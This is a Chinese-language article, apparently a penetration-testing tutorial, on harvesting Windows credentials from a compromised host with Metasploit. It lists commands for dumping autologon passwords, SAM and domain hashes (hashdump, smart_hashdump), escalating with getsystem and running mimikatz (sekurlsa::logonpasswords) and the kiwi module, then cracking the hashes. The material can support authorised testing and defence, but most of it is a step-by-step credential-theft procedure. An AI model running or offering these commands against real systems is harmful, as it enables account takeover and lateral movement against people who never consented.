> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485893&idx=1&sn=65122419e39d4c9c82d855852aad1cbc&chksm=eaad89f8ddda00eed9259a3a5a09f9ec442d1346a1a37a3931271e53ed6c26320c4d5e9574fa&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/VBXyERmr0fGhqCT8P1XGibdHSs6ibxOOQDwEvqNMufhKbBVeed02jow032wo243QyticdO6bKbpIWyANasZzWic9pg/640?wx_fmt=gif)

**目录**  

获取用户密码

抓取自动登录的密码

导出密码哈希

上传 mimikatz 程序

加载 kiwi 模块

加载 mimikatz 模块

![](https://mmbiz.qpic.cn/mmbiz_png/4EpCzKXdibPibicnYonkAeU6Ah89zyTox5dQZpJuEXzzYEohmmtozibYIjg6tTOV3MhobktVy0z2dlZXvBu3erZS2A/640?wx_fmt=png)

获取用户密码

![](https://mmbiz.qpic.cn/mmbiz_png/c6gqmhWiafyr9hQWuUCPvGMbftRydTk26KkMhMv3GyHGVzUaArA91tkdF6Ovo93CEVRHQJddq1BX3ZNNnzZETlg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8ZKQ8DibGukJsz3l6GawNw4qGWzqfbTRshnjQe6Er3sAJfXllmMgtmibg/640?wx_fmt=png)  

### 抓取自动登录的密码

**1：**很多用户习惯将计算机设置自动登录，可以使用  `run windows/gather/credentials/windows_autologin`  抓取自动登录的用户名和密码

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8halcJH83BIE7ib0XWmHnaMJgNE2kdUHicELdtxSTzp3WBGYwKL5HSnTw/640?wx_fmt=png)

### 导出密码哈希

**2：**hashdump 模块可以从 SAM 数据库中导出本地用户账号，执行：run hashdump ，该命令的使用需要**系统权限**

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8PocYblstAyGicrYTDHBhj226AbiaY44DPK0X0W9sQgWZL99Zy9icN4a0Q/640?wx_fmt=png)**

用户哈希数据的输出格式为：

```
用户名：SID：LM哈希：NTLM哈希:::
```

所以我们得到了三个用户账号，分别为 Administrator、Guest 和小谢。

其中 Administrator 和 Guest 的 LM 哈希（aad3b435b51404eeaad3b435b51404ee）和 NTLM 哈希（31d6cfe0d16ae931b73c59d7e0c089c0）对应的是一个空密码。所以，只有小谢的哈希有效。

接下来要处理的就是用户小谢 的密码（ a86d277d2bcd8c8184b01ac21b6985f6 ）了。我们可以使用类似 John 这样的工具来破解密码：John 破解 Windows 系统密码，或者使用在线网站解密：https://www.cmd5.com/default.aspx

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8jrKS3ytbk1ka2ZR214PmT2QR9nkrJ3owrH25KSibEMD0QnWobnEDt9A/640?wx_fmt=png)

还可以使用命令：run windows/gather/smart_hashdump  ，该命令的使用需要**系统权限。**该功能更强大，如果当前用户是域管理员用户，则可以导出域内所有用户的 hash

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8o9hIzibYEtA0nxn903Pp73CKRsaqXtBVf0fvJj2G60eOb07aLicNZn4Q/640?wx_fmt=png)

上传 mimikatz 程序

![](https://mmbiz.qpic.cn/mmbiz_png/c6gqmhWiafyr9hQWuUCPvGMbftRydTk26KkMhMv3GyHGVzUaArA91tkdF6Ovo93CEVRHQJddq1BX3ZNNnzZETlg/640?wx_fmt=png)

**3：**我们还可以通过上传 mimikatz 程序，然后执行 mimikatz 程序来获取明文密码。  

执行 mimikatz 必须 **System 权限**。

我们先 getsystem 提权至系统权限，然后执行  execute  -i  -f  mimikatz.exe ，进入 mimikatz 的交互界面。然后执行：

*   privilege::debug
    
*   sekurlsa::logonpasswords
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2el8IVJb5iaQMuhOH5eb7lm8QIKC9wn4OXTl7DS3oxFsTEoAIFTo0JZVCYJ7s7QYlaZ5iaRiczg57qGg/640?wx_fmt=png)

加载 kiwi 模块

![](https://mmbiz.qpic.cn/mmbiz_png/c6gqmhWiafyr9hQWuUCPvGMbftRydTk26KkMhMv3GyHGVzUaArA91tkdF6Ovo93CEVRHQJddq1BX3ZNNnzZETlg/640?wx_fmt=png)

**4：**加载 kiwi 模块，该模块的使用需要 **System 权限**。关于该模块的用法：  

[工具的使用 | MSF 中 kiwi 模块的使用](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485520&idx=1&sn=afe7ab1dd663bf8dcc9811c840f33614&chksm=eaad886dddda017b5ca9f42ac926ec8abdb42e958561924144f79aad5969c7310bf059e9ba03&scene=21#wechat_redirect)  

加载 mimikatz 模块

![](https://mmbiz.qpic.cn/mmbiz_png/c6gqmhWiafyr9hQWuUCPvGMbftRydTk26KkMhMv3GyHGVzUaArA91tkdF6Ovo93CEVRHQJddq1BX3ZNNnzZETlg/640?wx_fmt=png)

### **5：**或者运行 MSF 里面自带的 mimikatz 模块 ，该模块的使用需要 **System 权限**。传送门：[工具的使用 | MSF 中 mimikatz 模块的使用](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485867&idx=1&sn=0214e97984d0f85ae77f51e5b077c63e&chksm=eaad8996ddda0080eb00131f89a16fd429f10046fdb7409f6119497af317c13dc7e1d3fe33e7&scene=21#wechat_redirect)。目前该模块已经被 kiwi 模块代替了。